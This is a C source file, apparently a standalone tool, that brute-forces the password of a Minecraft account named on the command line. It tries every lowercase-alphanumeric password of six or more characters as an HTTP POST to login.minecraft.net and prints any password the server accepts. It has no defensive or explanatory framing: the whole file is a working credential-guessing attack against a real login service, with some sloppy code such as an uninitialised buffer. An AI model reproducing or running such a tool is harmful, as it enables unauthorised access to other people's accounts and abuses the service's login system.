#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <winsock2.h>

#define debug(MSG) printf("%s\n", MSG)
void brute(int);
void fillArray();
void SetSock(char *, int);

char *allowed, aSize;
int lastPass, sock, curP = 0;

char *auth = "REDACTED", *postHeader, *postBody;

int main(int argc, char *argv[]) {
	postHeader = malloc(8192 * sizeof(char));
	memset(postHeader, 0, 8192 * sizeof(char));
	strcpy(postHeader, "POST http://login.minecraft.net/ HTTP/1.0\r\n");
	strcat(postHeader, "User-Agent: Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1\r\n");
	strcat(postHeader, "Content-Type: application/x-www-form-urlencoded\r\n");
	strcat(postHeader, "Content-Length: ");
	postBody = malloc(8192 * sizeof(char));
	memset(postBody, 0, 8192 * sizeof(char));
	strcpy(postBody, "version=13&user=");
	strcat(postBody, argv[1]);
	strcat(postBody, "&password=");
	fillArray();
	int i, max = argc > 2 ? atoi(argv[2]) : 12;
	for(i = 6; i < max; i++) brute(i);
	return 0;
}

int sendPass(char *inpass, int size) {
	debug("Sendpass...");
	char *pass = malloc(size + 1), c, *post = malloc(8192 * sizeof(char)), *buf = malloc(8192 * sizeof(char));
	memset(pass, 0, size + 1);
	memset(buf, 0, 8192 * sizeof(char));
	memset(post, 0, 8192 * sizeof(char));
	for(c = 0; c < size; c++) pass[c] = allowed[inpass[c]];
	sprintf(post, "%s%i\r\n\r\n%s%s", postHeader, strlen(postBody) + size, postBody, pass);
	SetSock("login.minecraft.net", 80);
	send(sock, post, strlen(post), 0);
	recv(sock, buf, 8192 * sizeof(char), 0);
	if(strstr(buf, ":depracated:") != NULL) {
		printf("Password: %s\nTime spent: %fs\n%s+n", pass, ((clock() / (CLOCKS_PER_SEC / 1000)) - lastPass) / 1000.0, buf);
		free(pass);
		return 1;
	}
	free(pass);
	return 0;
}

void brute(int size) {
	char *pass = malloc(size * sizeof(char)), i;
	lastPass = clock() / (CLOCKS_PER_SEC / 1000);
	while (1) {
		for (i = 0; i < size; i++) {
			if (pass[i] > aSize) {
				pass[i + 1]++;
				pass[i] = 0;
			}
		}
		if(sendPass(pass, size) == 1) break;
		pass[0]++;
	}
	free(pass);
	#ifdef _WIN32
	WSACleanup();
	#endif
	exit(0);
}

void fillArray() {
	allowed = malloc(36);
	char i, arr = 0;
	for (i = 0x30; i < 0x3A; i++) allowed[arr++] = i;
	for (i = 0x61; i < 0x7B; i++) allowed[arr++] = i;
	aSize = arr - 1;
}

void SetSock(char *host, int port) {
	#ifdef _WIN32
	WSADATA	WsaData;
	WSAStartup (0x202, &WsaData);
	#endif
	struct sockaddr_in sin;
	sock = socket (AF_INET, SOCK_STREAM, 0);
	#ifdef _WIN32
	if(sock < 0) printf("Error: %i\n", WSAGetLastError());
	#else
	if(sock < 0) printf("Error setting socket!\n");
	#endif
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	struct hostent * host_addr = gethostbyname(host);
	sin.sin_addr.s_addr = *((int*)*host_addr->h_addr_list);
	if(connect(sock,(const struct sockaddr *)&sin, sizeof(struct sockaddr_in)) != 0) {
		debug("Failed to connect to host!");
		exit(1);
	}
}
